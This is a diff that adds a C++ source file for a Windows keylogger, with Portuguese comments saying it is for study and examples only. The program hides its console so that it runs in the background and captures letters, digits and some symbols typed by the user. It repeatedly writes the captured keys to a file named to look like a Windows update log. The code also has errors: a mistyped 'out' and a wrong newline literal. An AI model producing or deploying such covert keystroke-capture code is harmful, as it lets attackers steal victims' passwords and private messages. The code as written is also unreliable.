@@ -1,0 +1,223 @@
+//Keylogger codado em C++ so para uso de estudo e exemplos
+//AVISO:A possiveis erros de compilaçao
+#include <windows.h>
+#include <iostream>         
+#include <fstream>          
+
+using namespace std;
+
+int main(){
+    FreeConsole();   //deixa o serviço em background
+    string teclas;    //Declara a variavel teclas como string
+ 
+    while(1==1){  // Não usei o true pq estava dando erro
+      if(GetAsyncKeyState(0x41)){       //responsavel pela captura das teclas
+        cout << "a";     //41 é o equivale a letra "a" em HEXADECIMAL.               
+        teclas+= "a";    
+        Sleep(250);                      
+      };
+      if(GetAsyncKeyState(0x42)){
+        cout << "b";
+        teclas+= "b";
+        Sleep(250);                      
+      };
+      if(GetAsyncKeyState(0x43)){
+        cout << "c";
+        teclas+= "c";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x44)){
+        cout<<"d";
+        teclas+="d";
+        Sleep(250);                      
+      }; 
+      if(GetAsyncKeyState(0x45)){
+        cout<<"e";
+        teclas+="e";
+        Sleep(250);                      
+      };      
+     
+      if(GetAsyncKeyState(0x46)){
+        cout<<"f";
+        teclas+="f";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x47)){
+        cout<<"g";
+        teclas+="g";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x48)){
+        cout<<"h";
+        teclas+="h";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x49)){
+        cout<<"i";
+        teclas+="i";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x4a)){
+        cout<<"j";
+        teclas+="j";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x4b)){
+        cout<<"k";
+        teclas+="k";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x4c)){
+        cout<<"l";
+        teclas+="l";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x4d)){
+        cout<<"m";
+        teclas+="m";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x4e)){
+        cout<<"n";
+        teclas+="n";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x4f)){
+        cout<<"o";
+        teclas+="o";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x50)){
+        cout<<"p";
+        teclas+="p";
+        Sleep(250);                      
+      }; 
+      if(GetAsyncKeyState(0x51)){
+        cout<<"q";
+        teclas+="q";
+        Sleep(250);                      
+      };  
+      if(GetAsyncKeyState(0x52)){
+        cout<<"r";
+        teclas+="r";
+        Sleep(250);                      
+      };
+      if(GetAsyncKeyState(0x53)){
+        cout<<"s";
+        teclas+="s";
+        Sleep(250);                      
+      };  
+      if(GetAsyncKeyState(0x54)){
+        cout<<"t";
+        teclas+="t";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x55)){
+        cout<<"u";
+        teclas+="u";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x56)){
+        cout<<"v";
+        teclas+="v";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x57)){
+        out<<"w";
+        teclas+="w";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x58)){
+        cout<<"x";
+        teclas+="x";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x59)){
+        cout<<"y";
+        teclas+="y";
+        Sleep(250);                      
+      };      
+      if(GetAsyncKeyState(0x5A)){
+        cout<<"z";
+        teclas+="z";
+        Sleep(250);                      
+      }; 
+      if(GetAsyncKeyState(VK_SPACE)){
+        cout<<" ";
+        teclas+=" ";
+        Sleep(250);                      
+      }; 
+      if(GetAsyncKeyState(0x6E)){
+        cout<<".";
+        teclas+=".";
+        Sleep(250);                      
+      }; 
+      if(GetAsyncKeyState(0x0d)){
+        cout<<"/n";
+        teclas+="<br>";
+        Sleep(250);
+      };
+      if(GetAsyncKeyState(0x30)){
+        cout<<"0";
+        teclas+="0";
+        Sleep(250);                      
+      };
+      if(GetAsyncKeyState(0x31)){
+        cout<<"1";
+        teclas+="1";
+        Sleep(250);                      
+      };
+      if(GetAsyncKeyState(0x32)){
+        cout<<"2";
+        teclas+="2";
+        Sleep(250);                      
+      };
+      if(GetAsyncKeyState(0x33)){
+        cout<<"3";
+        teclas+="3";
+        Sleep(250);                      
+      };       
+      if(GetAsyncKeyState(0x34)){
+        cout<<"4";
+        teclas+="4";
+        Sleep(250);                      
+      };
+      if(GetAsyncKeyState(0x35)){
+        cout<<"5";
+        teclas+="5";
+        Sleep(250);                      
+      };
+      if(GetAsyncKeyState(0x36)){
+        cout<<"6";
+        teclas+="6";
+        Sleep(250);                      
+      };
+      if(GetAsyncKeyState(0x37)){
+        cout<<"7";
+        teclas+="7";
+        Sleep(250);                      
+      };
+      if(GetAsyncKeyState(0x38)){
+        cout<<"8";
+        teclas+="8";
+        Sleep(250);                      
+      };
+      if(GetAsyncKeyState(0x39)){
+        cout<<"9";
+        teclas+="9";
+        Sleep(250);                      
+      };
+      if(GetAsyncKeyState(0x40)){
+        cout<<"@";
+        teclas+="@";
+        Sleep(250);
+      };
+      
+          // cria um  arquvo txt para implementar as teclas digitadas...
+  ofstream arquivo;      
+  arquivo.open ("log-update-windows.txt"); // nome do arquivo que irão ficar guardada as teclas digitadas        
+  arquivo << teclas;                        // faz digita a string teclas no arquivo txt.
+  arquivo.close();                         // fecha.
+
+};
+}
